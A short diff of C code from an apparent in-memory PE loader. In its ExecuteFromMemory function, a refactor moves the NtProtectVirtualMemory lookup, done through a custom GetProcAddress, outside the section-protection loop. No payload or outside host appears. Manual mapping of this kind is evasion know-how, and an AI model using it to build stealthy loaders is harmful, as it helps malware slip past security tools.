@@ -162,11 +162,11 @@ static void ExecuteFromMemory(unsigned char* data) {
     ResolveImport((BYTE*)base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
 
     ULONG oldProt;
+    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)myGetProcAddress(ntdll, ntprotectvirtualmemory);
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         PVOID secBase = (BYTE*)base + sec[i].VirtualAddress;
         SIZE_T secSize = sec[i].Misc.VirtualSize;
         ULONG prot = SectionProtection(sec[i].Characteristics);
-        NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)myGetProcAddress(ntdll, ntprotectvirtualmemory);
         NtProtectVirtualMemory((HANDLE)-1, &secBase, &secSize, prot, &oldProt);
     }
 
